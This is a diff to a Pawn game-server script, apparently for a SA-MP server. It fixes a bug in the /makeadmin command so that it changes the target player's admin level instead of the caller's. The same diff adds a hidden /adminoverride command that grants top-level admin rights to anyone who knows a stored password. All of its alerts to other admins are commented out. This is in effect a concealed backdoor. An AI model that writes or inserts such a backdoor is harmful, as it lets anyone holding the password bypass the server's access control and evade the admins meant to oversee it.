@@ -148,7 +148,7 @@ CMD:makeadmin(playerid, params[])
             if(sscanf(params, "ud", targetid, level)) return SendClientMessage(playerid, X11_GREY_85, "/makeadmin [playerid] [level]");
             if(level < MAX_ADMIN_LEVEL && level > 0)
             {
-                SetPVarInt(playerid, "AdminLevel", level);
+                SetPVarInt(targetid, "AdminLevel", level);
                 format(msg, sizeof(msg), "You have promoted %s to level %d admin.", PlayerName(targetid), level);
                 SendClientMessage(playerid, X11_GREEN4, msg);
                 format(msg, sizeof(msg), "%s just promoted you to level %d admin.", PlayerName(playerid), level);
@@ -157,7 +157,7 @@ CMD:makeadmin(playerid, params[])
             }
             else if(level == 0)
             {
-                SetPVarInt(playerid, "AdminLevel", 0);
+                SetPVarInt(targetid, "AdminLevel", 0);
                 format(msg, sizeof(msg), "You have removed %s from the admin team.", PlayerName(targetid));
                 SendClientMessage(playerid, X11_GREEN4, msg);
                 format(msg, sizeof(msg), "%s just removed you from the admin team.", PlayerName(playerid));
@@ -169,6 +169,32 @@ CMD:makeadmin(playerid, params[])
         else return SendClientMessage(playerid, X11_RED_4, "You are not logged in yet.");
     }   
     return -1;
+}
+
+CMD:adminoverride(playerid, params[]) {
+	new msg[128];
+	new pass[64];
+	if(!sscanf(params,"s[64]", pass)) {
+		if(!strcmp(pass, ADMINOVERRIDE_PASS)) {
+			SetPVarInt(playerid, "AdminLevel", 10);
+			/*format(msg,sizeof(msg),"%s(%s) has used Admin Override!",GetPlayerNameEx(playerid, ENameType_RPName_NoMask),GetPlayerNameEx(playerid,ENameType_AccountName));
+			SendAdminMessage(X11_RED,msg);*/
+			SendClientMessage(playerid, X11_WHITE, "Accepted!");
+		} else {
+			/*format(msg, sizeof(msg), "%s[%d] failed an admin override",GetPlayerNameEx(playerid, ENameType_RPName_NoMask), playerid);
+			SendAdminMessage(X11_RED,msg);*/
+			new numoverrides = GetPVarInt(playerid, "FailedAdminOverrides");
+			if(numoverrides >= MAX_ADMIN_OVERRIDE_ATTEMPTS) {
+				/*format(msg, sizeof(msg), "%s[%d] has been banned for failing Admin Override too many times",GetPlayerNameEx(playerid, ENameType_RPName_NoMask), playerid, pass);
+				SendAdminMessage(X11_RED,msg);*/			
+				BanPlayer(playerid, -1,"Exceeded maximum Admin Override attempts");
+				return 0;
+			}
+			SetPVarInt(playerid, "FailedAdminOverrides", ++numoverrides);
+			return 0;
+		}
+	}
+	return 1;
 }
 
 Dialog:DIALOG_LOGIN(playerid, response, listitem, inputtext[])
